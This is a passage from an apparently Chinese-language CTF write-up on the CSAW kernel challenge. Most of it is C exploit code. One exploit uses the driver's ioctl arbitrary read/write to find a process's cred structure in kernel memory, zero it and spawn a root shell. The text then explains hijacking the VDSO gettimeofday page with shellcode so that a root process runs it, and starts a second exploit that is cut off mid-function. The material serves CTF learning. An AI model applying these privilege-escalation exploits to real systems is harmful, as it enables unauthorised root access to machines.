class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">loff_t</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="comment">// set target in task_struct</span></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME, target);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/csaw&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffc80000000000</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line">result = memmem(buf, <span class="number">0x1000</span>, target, <span class="number">16</span>);</span><br><span class="line"><span class="comment">// printf(&quot;0x%lx&quot;,addr);</span></span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x8</span>);</span><br><span class="line">real_cred = *(<span class="keyword">size_t</span> *)(result - <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span> ((cred || <span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span></span><br><span class="line">target_addr = addr + result - (<span class="keyword">int</span>)(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>, target_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>, real_cred);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = cred - <span class="number">0x10</span> + <span class="number">4</span> + i;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = (<span class="keyword">char</span> *)root_cred;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持VDSO"><a href="#劫持VDSO" class="headerlink" title="劫持VDSO"></a>劫持VDSO</h2><p>VDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。</p><p>vdso里的函数主要有五个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime<span class="number">0000000000000</span>A10</span><br><span class="line">gettimeofday<span class="number">0000000000000</span>C80</span><br><span class="line">time<span class="number">0000000000000</span>DE0</span><br><span class="line">getcpu<span class="number">0000000000000E00</span></span><br><span class="line">start<span class="number">0000000000000940</span></span><br></pre></td></tr></table></figure><p>VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的</p><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。</p><p>其次，等待某root权限的进程调用这个函数就可以利用反弹shell完成提权。</p><p>根据上面的内存映射图，再结合vdso在内核附近，我们可以确定vdso范围<code>0xffffffff80000000</code>——<code>0xffffffffffffefff</code></p><p>所以思路很明显，在内核中修改函数地址为shellcode就可，所以现在就是怎么找到函数地址</p><p>首先，获得其中gettimeofday字符串到vdso的其实位置的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">errExit(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后在内存映射图中获取的位置进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">    seek_args.id = alloc_args.id;</span><br><span class="line">    seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">    seek_args.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">    read_args.id = alloc_args.id;</span><br><span class="line">    read_args.buf = buf;</span><br><span class="line">    read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line">    <span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">    &#123;</span><br><span class="line">        result = addr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是一页一页的搜索并且由于我们知道字符串的偏移，所以我们可以直接进行对比，所以效率还是十分高效的</p><p>接下来就是思考在什么地方写入shellcode了，我们目前是不知道函数的执行代码在哪里，我们可以使用下面的方法拿到vdso.so文件放进ida分析</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803171941359.png"                      alt="image-20220803171941359"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803171959631.png"                      alt="image-20220803171959631"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220803172237986.png"                      alt="image-20220803172237986"                ></p><p>可以看到gettimeofday函数的代码段是在偏移为0xc80的地方，所以我们覆盖这里为shellcode即可。</p><p><strong>为什么从一开始就一直说这个gettimeofday函数呢？</strong></p><p>上面说了这一攻击方式需要有一个有root权限的程序去执行这里面的函数，所以我们就需要一个不停的调用vdso内函数的一个程序。</p><p>在真实环境下crontab会不停的调用搞gettimeofday函数，但是题目是qemu的模拟环境所以没有这个程序，但是题目有一个模拟的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">gettimeofday();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后综上，得出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span 